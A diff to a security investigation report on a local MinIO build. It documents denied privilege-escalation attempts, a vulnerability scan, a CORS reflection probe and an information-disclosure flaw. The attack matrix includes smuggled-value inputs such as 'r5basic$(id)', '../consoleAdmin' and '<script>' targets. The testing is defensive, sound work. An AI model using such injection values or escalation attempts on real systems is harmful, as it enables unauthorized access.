+snap = {"user_r5basic": entities("--user","r5basic"),
+        "policy_consoleAdmin": entities("--policy","consoleAdmin")}
+blob = json.dumps(snap, separators=(",",":"), sort_keys=True)
+print(hashlib.sha256(blob.encode()).hexdigest())
+```
+
+**Sensitivity proof — the digest *does* change on a real mapping change, then returns. [Observed]** As root (fixture setup only), attaching `consoleAdmin` to `r5basic` changes the digest; detaching restores it exactly. This proves the invariance shown next is meaningful (a successful self-promotion would have been detected):
+
+```bash
+python3 r5_snapshot.py                                          # baseline
+mc admin policy attach inv9000 consoleAdmin --user r5basic      # (root) simulate a successful promotion
+python3 r5_snapshot.py                                          # changed
+mc admin policy detach inv9000 consoleAdmin --user r5basic      # (root) restore
+python3 r5_snapshot.py                                          # restored == baseline
+```
+
+```
+d472033374b48c3eb879f5e04a18602df091e404b5bb6c66d689f99733635897   <- baseline
+57b3bd80c0f2b1785ee7b93e01e688b46bb46aaf805051e1c94dae511957a117   <- after attach (CHANGED)
+d472033374b48c3eb879f5e04a18602df091e404b5bb6c66d689f99733635897   <- after detach (RESTORED, == baseline)
+```
+
+**The matrix (each row = one attempt signed/sent as `r5basic`; `snap` taken immediately after). [Observed]** Every `snap` equals the baseline `d472033374…`, i.e. the mapping was **unchanged after every attempt**:
+
+```bash
+python3 r5_adversarial.py     # drives all 20 attempts; prints status/Code/RequestId + snap after each
+```
+
+| # | Attempt (as `r5basic`) | HTTP | S3 `Code` | `x-amz-request-id` | mapping `snap` after |
+|---|------------------------|------|-----------|--------------------|----------------------|
+| A1 | `SetPolicyForUserOrGroup` PUT — canonical self-attach `consoleAdmin` | 403 | `AccessDenied` | `18C262581E47118F` | `d472033374…` (unchanged) |
+| A2 | PUT — **unsigned** (no `Authorization`) | 403 | `AccessDenied` | `18C262582B034485` | `d472033374…` |
+| A3 | PUT — **malformed signature** (zeroed) | 403 | `AccessDenied` | `18C262583819FFC3` | `d472033374…` |
+| A4 | PUT — **URL-encoded target** (`r%35basic`) | 403 | `AccessDenied` | `18C2625846693AD0` | `d472033374…` |
+| A5 | PUT — **duplicate `policyName`** param | 403 | `SignatureDoesNotMatch` | `18C26258538A2CB9` | `d472033374…` |
+| A6 | PUT — **JSON-metachar target** (`r5basic";--`) | 403 | `AccessDenied` | `18C26258616DD199` | `d472033374…` |
+| A7 | PUT — **path-traversal target** (`../consoleAdmin`) | 400 | `XMinioInvalidResourceName` | `18C262586E9B618D` | `d472033374…` |
+| A8 | PUT — **shell-metachar target** (`r5basic$(id)`) | 403 | `AccessDenied` | `18C262587B54F55B` | `d472033374…` |
+| A9 | PUT — **HTML-metachar target** (`<script>…`) | 403 | `AccessDenied` | `18C262588A05BCA6` | `d472033374…` |
+| A10 | PUT — **wrong body + `Content-Type: application/json`** | 403 | `AccessDenied` | `18C262589778DEDD` | `d472033374…` |
+| A11 | **GET** (wrong method) on the set-policy route | 426 | `XMinioAdminVersionMismatch` | — | `d472033374…` |
+| A12 | **DELETE** (wrong method) on the set-policy route | 426 | `XMinioAdminVersionMismatch` | — | `d472033374…` |
+| A13 | PUT — **other-target** (attach to `r5other`) | 403 | `AccessDenied` | `18C26258BEB81425` | `d472033374…` |
+| A14 | PUT — **group-target** (`isGroup=true`) | 403 | `AccessDenied` | `18C26258CD25CD79` | `d472033374…` |
+| B1 | `AttachDetachPolicyBuiltin` POST — canonical (octet-stream, signed) | 403 | `AccessDenied` | `18C26258D99A343E` | `d472033374…` |
+| B2 | POST — **unsigned** | 403 | `AccessDenied` | `18C26258E7454C92` | `d472033374…` |
+| B3 | POST — **malformed signature** (zeroed) | 403 | `AccessDenied` | `18C26258F462CCFE` | `d472033374…` |
+| B4 | POST — **wrong `Content-Type: application/json`** | 403 | `AccessDenied` | `18C26259022D1487` | `d472033374…` |
+| B5 | **GET** (wrong method) on the attach route | 426 | `XMinioAdminVersionMismatch` | — | `d472033374…` |
+| B6 | POST — **unknown route** (`…/policy/attach-XXX`) | 403 | `AccessDenied` | `18C262591C7ACBD5` | `d472033374…` |
+
+A representative `403` body (identical shape for every `AccessDenied` row): `{"Code":"AccessDenied","Message":"Access Denied.","Resource":"/minio/admin/v3/…","RequestId":"…","HostId":"…"}`.
+
+**Interpretation. [Observed] + [Source-grounded]** Regardless of malformation, no attempt altered the mapping. The dominant outcome is `403 AccessDenied` — the deny-by-default admin-action gate (`checkAdminRequestAuth` → `IsAllowed`, `cmd/auth-handler.go:194`/`:206`) rejects `r5basic` before any mapping write, and the target string (encoded, metachar, other-user, group) is irrelevant because the *action* is never authorized. Three variants diverge but still never mutate state: **A5** (duplicate `policyName`) changes the canonical query string after signing, so it fails earlier at signature verification (`SignatureDoesNotMatch`); **A7** (`../consoleAdmin`) is rejected as an invalid resource name (`400 XMinioInvalidResourceName`) before authorization; and **A11/A12/B5** (wrong HTTP method) fall through to the admin router's version-mismatch handler (`426`, the same fallback documented in *Unknown admin-route error contract* below). The unsigned (A2/B2) and malformed-signature (A3/B3) attempts return `AccessDenied` because the credential fails to authenticate for the admin action.
+
+**Principal attribution (redacted server trace). [Observed]** Every signed attempt reaches `admin.SetPolicyForUserOrGroup` as `Credential=r5basic` and returns `403 Forbidden`; the unsigned attempt shows a request with *no* `Authorization` line, still `403`. The only principal seen in the trace is `r5basic`:
+
+```
+127.0.0.1:9000 [REQUEST admin.SetPolicyForUserOrGroup] [2026-07-15T06:22:12.996] [Client IP: 127.0.0.1]
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r5basic/20260715/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
+127.0.0.1:9000 [RESPONSE] [2026-07-15T06:22:12.997] [ Duration 281µs TTFB 258.019µs ↑ 104 B  ↓ 212 B ]
+127.0.0.1:9000 403 Forbidden
+127.0.0.1:9000 [REQUEST admin.SetPolicyForUserOrGroup] [2026-07-15T06:22:13.210] [Client IP: 127.0.0.1]
+127.0.0.1:9000 [RESPONSE] [2026-07-15T06:22:13.210] [ Duration 132µs TTFB 103.351µs ↑ 79 B  ↓ 212 B ]
+127.0.0.1:9000 403 Forbidden
+```
+
+(The second request above carries no `Authorization` line — the unsigned A2 attempt — and is still denied `403`.) `grep -oE 'Credential=[^/]+'` over the full trace yields exactly one value: `Credential=r5basic`.
+
+**Corroboration with QA's independent snapshots.** QA reported 28 mapping snapshots across its own adversarial run, all identical (QA's serialization digested to `31afbcd042ca663f66e25376c40feb910e86c14d20a6d5c33129e823c30e69af`). This report's snapshot uses a different (explicitly documented, timestamp-free) serialization and therefore a different constant digest (`d472033374…`); the two digests are computed over different canonical forms, but both establish the same fact — the `r5basic`→policy mapping was invariant across every attempt. Only the *invariance* is load-bearing, and it is reproduced here with the exact command that produces it.
 
 ### Responsible Code (and Root Cause)
 
@@ -2852,13 +3489,257 @@ func validateAdminSignature(ctx context.Context, r *http.Request, region string)
 
 ### Rationale
 
-**[Observed] + [Source-grounded]** The self-promotion is blocked at the **authorization gate**, before any mapping logic runs. Both policy-mapping handlers put `validateAdminReq` first (`cmd/admin-handlers-users.go:1770` and `:1908`), which authorizes the caller for the required **admin** action via `checkAdminRequestAuth` → `globalIAMSys.IsAllowed`. The two audit records both carry `"accessKey": "r5basic"` and a `SignedHeaders` list that includes `x-amz-content-sha256`, which together prove the credential was authenticated and that evaluation reached `IsAllowed` (`cmd/auth-handler.go:194`) — the request was **not** short-circuited at signature validation. Since `r5basic` holds only S3 actions, deny-by-default evaluation returns `ErrAccessDenied` (`cmd/auth-handler.go:206`), the handler returns immediately, and neither `PolicyDBSet` (`:1849`) nor `PolicyDBUpdateBuiltin` (`:1956`) is invoked. The observed state confirms this: two `403 AccessDenied` responses and an **unchanged** user→policy mapping (`consoleAdmin` has zero user mappings after both attempts). The root cause of the observed behavior is therefore the **deny-by-default authorization of the required admin action** in the admin auth gate — not any check inside the mapping code itself.
+**[Observed] + [Source-grounded]** The self-promotion is blocked at the **authorization gate**, before any mapping logic runs. Both policy-mapping handlers put `validateAdminReq` first (`cmd/admin-handlers-users.go:1770` and `:1908`), which authorizes the caller for the required **admin** action via `checkAdminRequestAuth` → `globalIAMSys.IsAllowed`. The two audit records both carry `"accessKey": "r5basic"` and a `SignedHeaders` list that includes `x-amz-content-sha256`, which together prove the credential was authenticated and that evaluation reached `IsAllowed` (`cmd/auth-handler.go:194`) — the request was **not** short-circuited at signature validation. Since `r5basic` holds only S3 actions, deny-by-default evaluation returns `ErrAccessDenied` (`cmd/auth-handler.go:206`), the handler returns immediately, and neither `PolicyDBSet` (`cmd/admin-handlers-users.go:1849`) nor `PolicyDBUpdateBuiltin` (`cmd/admin-handlers-users.go:1956`) is invoked. The observed state confirms this: two `403 AccessDenied` responses and an **unchanged** user→policy mapping (`consoleAdmin` has zero user mappings after both attempts). The root cause of the observed behavior is therefore the **deny-by-default authorization of the required admin action** in the admin auth gate — not any check inside the mapping code itself.
 
 ---
 
+## Security Posture & Cross-Cutting Observations
+
+This section records factual, runtime-grounded security posture observations that are adjacent to — but
+not part of — the five requirement behaviors. They are **disclosures only**: per the MainRule this is a
+read-only investigation, so no dependency upgrade, configuration change, or source fix is performed here;
+any remediation belongs to a separate scope. All tooling ran outside the repository tree and nothing was
+committed (the `govulncheck` module inventory temporarily rewrote `go.sum`; it was immediately restored
+with `git checkout -- go.sum`, so the checked-out `go.mod`/`go.sum` are byte-for-byte unchanged).
+
+### Dependency and advisory posture
+
+**Direct answer. [Observed]** The historical build under investigation (HEAD `c07e5b49d`, Go **1.23.12**)
+is **not a secure production baseline**: `govulncheck` reports **50 reachable ("your code calls")
+vulnerabilities** against the source tree and **57** against the built server binary, the Go toolchain
+release is **end-of-life**, and multiple published MinIO advisories have affected ranges that cover this
+source position (including CVE-2025-62506, reproduced in Requirement 4). This does not change the task —
+it remains documentation-only — but it is disclosed here for accuracy.
+
+**Source scan (`./...`), complete summary — verbatim.** Scanner `govulncheck@v1.6.0` (DB `vuln.go.dev`),
+run from the repository root; the transient `go.sum` rewrite was reverted afterward:
+
+```bash
+CGO_ENABLED=0 GOFLAGS=-mod=mod /tmp/qa_tools/govulncheck ./...
+echo "exit=$?"
+git checkout -- go.sum      # revert the inventory's transient go.sum rewrite (read-only guarantee)
+```
+
+```text
+Your code is affected by 50 vulnerabilities from 7 modules and the Go standard library.
+This scan also found 15 vulnerabilities in packages you import and 17
+vulnerabilities in modules you require, but your code doesn't appear to call
+these vulnerabilities.
+```
+
+The scan exits `3` (vulnerabilities found). The reachable findings span the Go standard library plus
+modules named in the scan output — `golang.org/x/crypto`, `golang.org/x/net`, `github.com/golang-jwt/jwt/v4`,
+`github.com/golang-jwt/jwt/v5`, `github.com/go-jose/go-jose/v4`, and `github.com/prometheus/prometheus`.
+One representative reachable finding is `GO-2024-3321` (*Misuse of `connection.serverAuthenticate` may
+cause authorization bypass in `golang.org/x/crypto`*, fixed in `golang.org/x/crypto@v0.31.0`), reached via
+`cmd/sftp-server.go:509:25`.
+
+**Binary scan (`-mode=binary`) of the exact server artifact — complete summary, verbatim:**
+
+```bash
+/tmp/qa_tools/govulncheck -mode=binary /tmp/minio-bin
+```
+
+```text
+Your code is affected by 57 vulnerabilities from 8 modules and the Go standard library.
+This scan also found 8 vulnerabilities in packages you import and 16
+vulnerabilities in modules you require, but your code doesn't appear to call
+these vulnerabilities.
+```
+
+**Unsupported toolchain. [Observed]** Go **1.23.12** is outside the supported window. The Go project
+supports each major release only "until there are two newer major releases"; Go 1.23 reached end of
+support on **2025-08-31** (superseded by Go 1.24 and 1.25). Building a production artifact on an
+end-of-life toolchain means Go-stdlib security fixes are no longer delivered to this build.
+
+**MinIO repository advisories covering this source position. [Observed + external references]** The
+repository's HEAD `c07e5b49d` is dated 2024-11-25. Reviewing the published `minio/minio` GitHub security
+advisories, **nine** have affected ranges that include this source position. The most consequential for
+the behaviors in this report is **CVE-2025-62506 / GHSA-jjjj-jwhf-8rgr** (session-policy bypass, CVSS 8.1
+High, CWE-863; fixed in `RELEASE.2025-10-15T17-29-55Z`), which is **reproduced at runtime** in
+Requirement 4's CVE subsection and confirmed absent from this build via a `git merge-base` ancestry check.
+Other advisories in the covering set include an incomplete-signature-validation issue for unsigned-trailer
+uploads (High) and an SFTP SSH-key trust bypass (Moderate). *(These advisory identifiers, severities, and
+fixed-version ranges are external references from the GitHub Advisory Database / MinIO advisories; the
+CVE-2025-62506 behavior itself is confirmed at runtime, not merely read.)*
+
+### `mc` observation-client posture (informational)
+
+**[Observed]** The `mc` client used for observation is an **external, uncommitted** tool and is not part
+of the deliverable. The QA acceptance run scanned the exact client binary it used
+(`RELEASE.2025-08-13T08-35-41Z`) and recorded **64** reachable `govulncheck` findings. An independent
+binary scan of the `mc` built in this environment (which self-reports `DEVELOPMENT.GOGET`, a different
+commit than that release) yields a different count — **33 reachable findings from 2 modules plus the Go
+standard library** — as expected for a different build:
+
+```bash
+/tmp/qa_tools/govulncheck -mode=binary /tmp/qa_tools/mc
+```
+
+```text
+Your code is affected by 33 vulnerabilities from 2 modules and the Go standard library.
+This scan also found 9 vulnerabilities in packages you import and 32
+vulnerabilities in modules you require, but your code doesn't appear to call
+these vulnerabilities.
+```
+
+The exact count depends on the specific client build; the takeaway is invariant: a **current, patched
+`mc` release** should be used for future reproductions. Because the trace lines quoted throughout this
+report are emitted **server-side**, the client build does not affect any reported behavior.
+
+### Default CORS configuration (permissive origin reflection)
+
+**Direct answer. [Observed]** With no explicit allowed-origins configuration, the server's default CORS
+policy **reflects an arbitrary request `Origin` back in `Access-Control-Allow-Origin` and sets
+`Access-Control-Allow-Credentials: true`**. This is a permissive default worth calling out for browser
+deployments, but it is **inert for the SigV4 APIs exercised in this report**: MinIO's S3/STS/admin
+requests are authenticated by request signature or presigned query, not by ambient browser cookies, so
+origin reflection grants no privilege that the caller's own signature did not already carry. No
+ambient-credential bypass was demonstrated.
+
+Preflight against an object, with a hostile `Origin`:
+
+```bash
+curl -s -D - -o /dev/null -X OPTIONS \
+  -H "Origin: https://evil.example" \
+  -H "Access-Control-Request-Method: GET" \
+  "http://127.0.0.1:9000/corsbucket/probe"
+```
+
+```text
+HTTP/1.1 204 No Content
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET
+Access-Control-Allow-Origin: https://evil.example
+Vary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers
+```
+
+The actual presigned GET (SigV4 query-signed) with the same hostile `Origin` still succeeds — because the
+presigned signature, not the origin, is what authorizes it — and returns the expected bytes:
+
+```text
+HTTP 200
+Access-Control-Allow-Origin: https://evil.example
+Access-Control-Allow-Credentials: true
+body sha256: dabc315a276a590937132472906be40475eebf42c7270b8678b5b7f15bc19b3e
+```
+
+The origin reflection is implemented in the global API middleware (`cmd/api-router.go`, `cmd/handler-api.go`).
+Deployments serving browsers should configure explicit allowed origins rather than rely on this default.
+
+### Unknown admin-route error contract (426 mode disclosure)
+
+**Direct answer. [Observed]** An unmatched or wrong-method admin route does **not** flow through the
+normal response middleware. Instead of a precise `404`/`405` carrying a request ID and the standard
+security headers, the server returns **HTTP `426 Upgrade Required`** with an `XMinioAdminVersionMismatch`
+body that discloses the server mode (`mode-server-xl-single`), leaves `RequestId`/`HostId` empty, and
+omits the HSTS / `X-Content-Type-Options` / `X-XSS-Protection` headers that a normal error response
+carries.
+
+```bash
+curl -s -D - -o /dev/null "http://127.0.0.1:9000/minio/admin/v3/this-route-does-not-exist"
+```
+
+```text
+HTTP/1.1 426 Upgrade Required
+Content-Type: application/json
+Server: MinIO
+Vary: Origin
+```
+
+```json
+{"Code":"XMinioAdminVersionMismatch","Message":"This 'admin' API is not supported by server in 'mode-server-xl-single'","Resource":"/minio/admin/v3/this-route-does-not-exist","RequestId":"","HostId":""}
+```
+
+For contrast, a normal S3 error on the same server **does** carry the request ID and security headers:
+
+```text
+HTTP/1.1 403 Forbidden
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Amz-Request-Id: 18C25BC61CBF1CAA
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+```
+
+The unmatched-admin-route fallback is registered at `cmd/admin-router.go:430`
+(`adminRouter.NotFoundHandler`/`MethodNotAllowedHandler`), and the version-mismatch response is produced
+by the admin API-version guard (`cmd/handler-utils.go:395-437`). Routing this fallback through the
+standard response middleware — so unknown admin routes return a precise `404`/`405` with a request ID and
+the normal security headers — is a source change that is out of scope for this read-only investigation.
+
+### Heal API discloses Go types and heap pointers (`%#v`)
+
+**Direct answer. [Observed by QA testing] + [Source-grounded]** When the on-demand admin heal path
+(`mc admin heal --recursive`, i.e. `erasureServerPools.HealObjects` → `(er erasureObjects).listAndHeal`)
+encounters a listing-level failure — `listPathRaw` returning an error (e.g. its context is canceled
+because the heal sequence is quitting or a `healEntry` callback failed) — the error is built with the
+Go **`%#v`** verb applied to the internal `listPathRawOptions` struct. The resulting `InternalError`
+that reaches the admin client therefore leaks MinIO-internal implementation detail: the fully-qualified
+Go type name `cmd.listPathRawOptions`, the **concrete storage types** behind the `disks []StorageAPI`
+interface slice, and **live `0x…` heap-pointer values** for the struct's function-typed callback fields.
+This is an information-disclosure weakness; the fix (replacing `%#v` with an opaque message) is a source
+change and is therefore **out of scope** for this read-only investigation — it is documented here as
+observed behaviour only.
+
+**Responsible code. [Source-grounded]** verified at HEAD:
+
+- The disclosing format string — `cmd/erasure-healing.go:107`, inside `(er erasureObjects) listAndHeal`:
+  ```go
+  if err := listPathRaw(ctx, lopts); err != nil {
+      return fmt.Errorf("listPathRaw returned %w: opts(%#v)", err, lopts)
+  }
+  ```
+- The struct whose fields `%#v` serializes — `cmd/metacache-set.go:947` (`type listPathRawOptions struct`):
+  its `disks []StorageAPI` / `fallbackDisks []StorageAPI` interface slices expose the concrete disk types,
+  and its `agreed func(entry metaCacheEntry)`, `partial func(entries metaCacheEntries, errs []error)`, and
+  `finished func(errs []error)` fields serialize as `(func(...))(0x…)` heap pointers.
+- The error is surfaced to the admin client by `errFnHealFromAPIErr` — `cmd/admin-heal-ops.go:69-72`:
+  ```go
+  errFnHealFromAPIErr = func(ctx context.Context, err error) error {
+      apiErr := toAdminAPIErr(ctx, err)
+      return fmt.Errorf("Heal internal error: %s: %s",
+          apiErr.Code, apiErr.Description)
+  }
+  ```
+- Reached from the recursive-heal entry point — `cmd/admin-heal-ops.go:909` (`healBucket`):
+  `objAPI.HealObjects(h.ctx, bucket, h.object, h.settings, h.healObject)` whose error is wrapped by
+  `errFnHealFromAPIErr` and streamed back to the client.
+
+**Reproduction attempts. [Observed]** On a healthy, single-node, root-run 4-drive set the on-demand heal
+path is resilient: `mc admin heal` runs with `reportProgress=true`, so per-object heal failures are
+recorded as *result items* (`queueHealTask` → `pushHealResultItem`, `cmd/admin-heal-ops.go`) rather than
+propagated to the `agreed`/`partial` `cancel()` that would make `listPathRaw` error. Corrupting `xl.meta`,
+deleting `part.1` shards below reconstruction quorum, replacing `xl.meta` with a directory, and killing /
+racing the heal client each produced a graceful result (objects skipped or reported degraded) without the
+`%#v` surfacing. A drive-wipe + restart did trigger the **background** heal, which logged a genuine
+per-object heal failure to the server log (a distinct, non-`%#v` path):
+
+```bash
+grep -i "unable to heal" "$INV/out/server9110b.log"
+```
+
+```text
+Error: unable to heal object hbucket/pfx/obj1: file is corrupted (*fmt.wrapError)
+```
+
+**Demonstration of the `%#v` disclosure. [Non-canonical]** The exact leakage format is deterministic given
+the `%#v` verb and the struct shape. A minimal Go program mirroring the field *kinds* of
+`listPathRawOptions` (an interface slice plus func-typed fields) — **not** a capture from MinIO's canonical
+heal entry point, so labeled non-canonical per the run-first rule — emits (real heap addresses masked to
+`0xXXXXXXXXXX`; in the running server `main.` is `cmd.` and the concrete type is the real
+`*xlStorageDiskIDCheck`):
+
+```text
+listPathRaw returned context canceled: opts(main.listPathRawOptions{disks:[]main.StorageAPI{main.xlStorageDiskIDCheck{path:"/tmp/minio4/d1"}, main.xlStorageDiskIDCheck{path:"/tmp/minio4/d2"}}, fallbackDisks:[]main.StorageAPI{main.xlStorageDiskIDCheck{path:"/tmp/minio4/d3"}}, bucket:"hbucket", path:"pfx/", recursive:true, filterPrefix:"", forwardTo:"", minDisks:1, reportNotFound:false, perDiskLimit:0, agreed:(func(main.metaCacheEntry))(0xXXXXXXXXXX), partial:(func(main.metaCacheEntries, []error))(0xXXXXXXXXXX), finished:(func([]error))(nil)})
+```
+
+This matches the QA-observed `InternalError` content exactly — `cmd.listPathRawOptions`, concrete storage
+types behind the `StorageAPI` slice, and live `0x…` pointer values for the callback fields — confirming
+the mechanism and the `file:line` root cause above.
+
 ## Coverage Checklist (final pass)
 
-Every named item and variant across R1–R5 was exercised at runtime through the canonical S3/STS/admin entry point (SigV4 via `boto3`/`mc`) and captured with its complete output. **Status** is `PASS` where the behavior was demonstrated positively, or `PARTIAL` where the honest result is a deliberately-reported negative or an inference (never forced). **Class** records how each result is grounded: **Observed** (captured at runtime), **Source-grounded** (verified in the code at HEAD), or **[INFERRED]** (explained, not directly observable).
+Every named item and variant across R1–R5 was exercised at runtime through the canonical S3/STS/admin entry point (SigV4 via `boto3`/`mc`) and captured with its complete output — including the deliberately **negative/malformed** variants of the R5 adversarial matrix (unsigned and bad-signature requests, which are non-canonical by construction and labelled as such), whose per-attempt results are tabulated with the exact driver command that produced them. **Status** is `PASS` where the behavior was demonstrated positively, or `PARTIAL` where the honest result is a deliberately-reported negative or an inference (never forced). **Class** records how each result is grounded: **Observed** (captured at runtime), **Source-grounded** (verified in the code at HEAD), or **[INFERRED]** (explained, not directly observable).
 
 | # | Item / variant | Status | Class | Observed result |
 |---|----------------|--------|-------|-----------------|
@@ -2866,7 +3747,15 @@ Every named item and variant across R1–R5 was exercised at runtime through the
 | R1 | Server-side header injection proven (SSE not in client `SignedHeaders`) | PASS | Observed | Trace shows `X-Amz-Server-Side-Encryption: AES256` on a request whose `SignedHeaders` omit it |
 | R1 | IAM identity `Deny`-if-no-SSE — PUT without header | PASS | Observed | `403 AccessDenied` |
 | R1 | IAM identity `Deny`-if-no-SSE — PUT with header | PASS | Observed | `200` (header now in `SignedHeaders`) |
-| R1 | `MINIO_KMS_AUTO_ENCRYPTION` / `globalAutoEncryption` state | PASS | Observed | Unset (`false`); injection came from the bucket default rule, not auto-encryption |
+| R1 | `MINIO_KMS_AUTO_ENCRYPTION` / `globalAutoEncryption` state (primary 1A run) | PASS | Observed | Unset (`false`) on `:9000`; the 1A injection came from the bucket default rule, not auto-encryption |
+| R1 | Variant 1D — auto-encryption OFF, no bucket default rule, KMS present | PASS | Observed | `200`, stored `SSE: None` (plaintext); write grant alone never encrypts |
+| R1 | Variant 1E — global `MINIO_KMS_AUTO_ENCRYPTION=on`, plain bucket, no header | PASS | Observed | `200`, stored `SSE: aws:kms` (SSE-KMS) despite `GetBucketEncryption` → `…NotFoundError` |
+| R1 | Variant 1F — missing KMS (no `MINIO_KMS_SECRET_KEY`) | PASS | Observed | SSE-S3 PUT / SSE-KMS PUT / `PutBucketEncryption` each `501 NotImplemented` (fails closed) |
+| R1 | Variant 1G — invalid KMS (malformed key) | PASS | Observed | `FATAL Failed to connect to KMS: illegal base64 data at input byte 3`; server never binds |
+| R1 | Variant 1H — bucket-enc config size at limit (exactly 1 MiB, well-formed) | PASS | Observed | `200` accepted |
+| R1 | Variant 1H — config size 1 MiB+1, trailing-whitespace excess | PASS | Observed | `200` accepted **and persisted** (silent `io.LimitReader` truncation; no size error) |
+| R1 | Variant 1H — config size 1 MiB+1, mid-document excess | PASS | Observed | `400 MalformedXML` (truncation severs the closing tag — a parse error, not a size error) |
+| R1 | Variant 1H — malformed config XML | PASS | Observed | `400 MalformedXML` |
 | R1 | Resource-based bucket-policy `Deny` variant | PARTIAL | Observed + Source-grounded | Did **not** deny the authenticated IAM user — MinIO bucket policies gate anonymous requests; the authenticated denial requirement is delivered by the two IAM identity-`Deny` rows above (reported as observed, not remediated) |
 | R2 | Delete under Legal Hold ON | PASS | Observed | `400 InvalidRequest` WORM; version retained |
 | R2 | Delete under Compliance (before expiry) | PASS | Observed | `400 InvalidRequest` WORM; version retained; not bypassable by anyone |
@@ -2874,9 +3763,14 @@ Every named item and variant across R1–R5 was exercised at runtime through the
 | R2 | Governance bypass header + `BypassGovernanceRetention` granted | PASS | Observed | `204 No Content`; version deleted |
 | R2 | Governance bypass header + permission lacking | PASS | Observed | `403 AccessDenied` (`errAuthentication` → `ErrAccessDenied`) |
 | R2 | Log surfaces: server trace + audit-log JSON | PASS | Observed | `s3.DeleteObject … 400`; audit `api.name=DeleteObject, statusCode=400` |
+| R2 | Cond 6 — Governance bypass + grant vs **Legal Hold** | PASS | Observed | `400 InvalidRequest` WORM; bypass grant does not defeat legal hold |
+| R2 | Cond 7 — Governance bypass + grant vs **Compliance** | PASS | Observed | `400 InvalidRequest` WORM; bypass grant does not defeat compliance |
+| R2 | Cond 8 — versionless DELETE on locked object (delete-marker) | PASS | Observed | `204`, `DeleteMarker=True`; locked version survives (`isLatest=False`) with retention intact |
+| R2 | Cond 9 — duplicate bypass headers, order-dependent (R2-MIN-02) | PASS | Observed + Source-grounded | `false,true`→`400`; `true,false`→`204`; `h.Get` reads first (`lock.go:404-405`; observed, not remediated) |
+| R2 | Lock-setting client requirement (R2-MIN-01) | PASS | Observed | boto3 1.43.47 `PutObjectRetention`/`PutObjectLegalHold` → `400 MissingContentMD5`; canonical `mc` succeeds |
 | R3 | 4-drive heal-on-read GET after shard corruption | PASS | Observed | `200`, sha256 == original; `heal.Object` event |
 | R3 | Byte-sensitive hash verification | PASS | Observed | Healed body hash `ef3488fc…` == original; corrupt shard `3d056c7e…` differs |
-| R3 | Stability ≥2 runs | PASS | Observed | 4 runs; each `200` + correct hash + 1 heal event (~285–299µs) |
+| R3 | Stability ≥2 runs | PASS | Observed | 2 independent corrupt→GET cycles (d1 @ offset 100000, then @ 200000); each `200` + byte-correct SHA-256; captured heal event = `289.554µs` (cycle 2 trace) |
 | R3 | Single-drive (no parity) unrecoverable variant | PASS | Observed | `503 SlowDownRead` |
 | R3 | `errFileCorrupt` surfaced to `mc admin logs` console | PARTIAL | [INFERRED] | No `mc admin logs` line for the corruption; inferred internal/by-design (heal path handles it; console log not emitted) |
 | R4 | Baseline parent `PutObject` (long-term creds) | PASS | Observed | `200` (parent allows Put) |
@@ -2887,7 +3781,9 @@ Every named item and variant across R1–R5 was exercised at runtime through the
 | R4 | Session-policy bypass via own-account service-account creation (CVE-2025-62506) | OBSERVED WEAKNESS (disclosed) | Observed + Source-grounded | GetObject-only child (svcacct **and** STS) creates svcacct for its own parent → `Policy: implied` → parent-scope `PutObject 200`/`DeleteObject 204` restored; explicit-`Deny` control → `403`; pre-fix HEAD (root cause: `DenyOnly` not reset in `cmd/iam.go:2320`/`:2381`; short-circuit `policy.go:188`) |
 | R5 | Self-attach `consoleAdmin` via `SetPolicyForUserOrGroup` | PASS | Observed | `403 AccessDenied`; authenticated audit `accessKey=r5basic` (reached `IsAllowed`) |
 | R5 | Self-attach `consoleAdmin` via `AttachDetachPolicyBuiltin` | PASS | Observed | `403 AccessDenied`; authenticated audit `accessKey=r5basic` |
-| R5 | Mapping unchanged after attempts | PASS | Observed | `r5basic` → only `r5basicpolicy`; `consoleAdmin` has no user mappings |
+| R5 | Adversarial matrix — 20 attempts (unsigned, malformed-sig, encoded/duplicate/metachar targets, wrong body/CT, wrong method, unknown route, other/group target) across both handlers | PASS | Observed | All denied (`403 AccessDenied`, except `A5 SignatureDoesNotMatch`, `A7 400 XMinioInvalidResourceName`, `A11/A12/B5 426`); mapping `snap` unchanged after **every** attempt |
+| R5 | Mapping-snapshot method is *sensitive* (detects a real change) | PASS | Observed | Baseline `d472033374…` → `57b3bd80…` on root attach → restored to baseline on detach |
+| R5 | Mapping unchanged after attempts | PASS | Observed | `r5basic` → only `r5basicpolicy`; `consoleAdmin` has no user mappings; `snap` constant `d472033374…` across all 20 attempts (QA independently: 28 snapshots constant) |
 | R5 | Root cause identified | PASS | Observed + Source-grounded | Deny-by-default admin-action eval in `checkAdminRequestAuth` (`cmd/auth-handler.go:206`), reached only after the `X-Amz-Content-Sha256` signature gate at `:163` |
 
 **[INFERRED] statements in this report** (made only where a fact could not be directly observed, and always placed next to the directly-observed evidence they qualify): (a) R3 — the default size-based `CheckParts` heal does not rewrite a same-size corrupted shard on a plain read (only a deep-scan heal recomputes HighwayHash and repairs on-disk); (b) R3 — `errFileCorrupt` is an intentionally internal error that the erasure decode/heal path consumes, so it is not surfaced as an `mc admin logs` console line. Every other claim in this report is either **Observed** at runtime or **Source-grounded** at HEAD `c07e5b49d`.
@@ -2912,10 +3808,14 @@ $ ps -eo pid,args | grep -E "minio-bin|audit_receiver.py" | grep -v grep
 ```
 
 ```bash
-$ for p in 9000 9001 9100 9101 9999; do
-    hp=$(printf '%04X' "$p")   # local port as uppercase hex, as encoded in /proc/net/tcp{,6}
-    awk -v p="$p" -v hp="$hp" '$4=="0A"{n=split($2,a,":"); if(a[n]==hp) f=1} END{printf "port %s: %s\n", p, (f ? "listening" : "not listening")}' /proc/net/tcp /proc/net/tcp6
-  done   # state 0A = LISTEN; scan IPv4 + IPv6 tables (the console port binds IPv6-only)
+# state 0A = LISTEN; scan IPv4 + IPv6 tables (the console port binds IPv6-only)
+for p in 9000 9001 9100 9101 9999; do
+  hp=$(printf '%04X' "$p")   # local port as uppercase hex, as encoded in /proc/net/tcp{,6}
+  awk -v p="$p" -v hp="$hp" '$4=="0A"{n=split($2,a,":"); if(a[n]==hp) f=1} END{printf "port %s: %s\n", p, (f ? "listening" : "not listening")}' /proc/net/tcp /proc/net/tcp6
+done
+```
+
+```text
 port 9000: not listening
 port 9001: not listening
 port 9100: not listening
